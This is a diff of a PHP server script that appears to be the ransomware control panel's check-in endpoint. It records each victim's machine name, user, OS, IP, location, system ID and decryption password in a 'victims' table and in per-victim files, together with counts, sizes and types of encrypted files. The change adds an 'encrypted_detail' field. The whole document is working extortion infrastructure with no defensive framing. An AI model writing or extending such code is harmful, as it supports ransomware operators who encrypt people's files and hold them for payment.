@@ -36,6 +36,7 @@ $password       = $_POST['password']       ?? '';
 $encrypted_count = intval($_POST['encrypted_count'] ?? 0);
 $encrypted_size  = intval($_POST['encrypted_size']  ?? 0);
 $encrypted_types = $_POST['encrypted_types'] ?? '';
+$encrypted_detail = $_POST['encrypted_detail'] ?? '';
 
 // 安全文件名
 $safe_machine  = sanitize_filename($machine_name);
@@ -58,8 +59,8 @@ file_put_contents($target_dir . '/' . $file, $password);
 
 // PDO预处理插入
 $stmt = $pdo->prepare(
-    'INSERT INTO victims (machine_name, computer_user, os, date, time, ip, location, systemid, password, encrypted_count, encrypted_size, encrypted_types)
-     VALUES (:machine_name, :computer_user, :os, :date, :time, :ip, :location, :systemid, :password, :encrypted_count, :encrypted_size, :encrypted_types)'
+    'INSERT INTO victims (machine_name, computer_user, os, date, time, ip, location, systemid, password, encrypted_count, encrypted_size, encrypted_types, encrypted_detail)
+     VALUES (:machine_name, :computer_user, :os, :date, :time, :ip, :location, :systemid, :password, :encrypted_count, :encrypted_size, :encrypted_types, :encrypted_detail)'
 );
 $stmt->execute([
     ':machine_name'    => $machine_name,
@@ -74,6 +75,7 @@ $stmt->execute([
     ':encrypted_count' => $encrypted_count,
     ':encrypted_size'  => $encrypted_size,
     ':encrypted_types' => $encrypted_types,
+    ':encrypted_detail'=> $encrypted_detail,
 ]);
 
 echo 'handshake completed';
